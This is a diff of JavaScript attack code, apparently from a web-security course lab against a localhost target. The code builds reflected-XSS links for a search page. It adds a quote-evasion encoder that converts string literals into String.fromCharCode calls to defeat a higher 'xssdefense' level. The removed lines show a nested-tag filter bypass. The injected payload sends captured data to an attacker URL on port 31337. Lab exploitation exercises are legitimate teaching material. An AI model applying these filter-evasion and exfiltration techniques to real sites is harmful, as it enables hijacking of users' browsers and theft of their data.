@@ -3,6 +3,7 @@
 <script>
 
 function payload(attacker) {
+    var url = window.location.href.substring("http://127.0.0.1/project2/".length);
     function log(data) {
         console.log($.param(data))
         $.get(attacker, data);
@@ -30,12 +31,33 @@ function payload(attacker) {
 }
 
 function makeLink(xssdefense, target, attacker) {
-    return target + "./search?csrfdefence=1&xssdefense=" + xssdefense.toString() + "&q=" + 
-        encodeURIComponent("<scrscriptipt" + ">" + "var url = window.location.href.substring(\"http://127.0.0.1/project2/\".length); " + payload.toString() + ";payload(\"" + 
-        attacker + "\");" + "<" + "/scrscriptipt" + ">");
+    var url = "<script" + ">" + payload.toString() + "; payload(\"" + 
+        attacker + "\");" + "<" + "/script" + ">";
+    var isStr = false;
+    var out = "";
+    var str = "String.fromCharCode("
+    for(var i = 0; i < url.length; i++) {
+        var c = url.charAt(i);
+        var j = url.charCodeAt(i);
+        if(!isStr && j == 34) {
+            isStr = true;
+            out = out.concat("String.fromCharCode(");
+        }
+        else if(j == 34) {
+            isStr = false;
+            out = out.slice(0,-1).concat(")");
+        }
+        else if(isStr) {
+            out = out.concat(j.toString() + ", ");
+        }
+        else {
+            out = out.concat(c);
+        }
+    }
+    return target + "./search?xssdefense=" + xssdefense.toString() + "&csrfdefence=1&q=" + encodeURIComponent(out);
 }
 
-var xssdefense = 1;
+var xssdefense = 3;
 var target = "http://localhost/project2/";
 var attacker = "http://localhost:31337/";
 
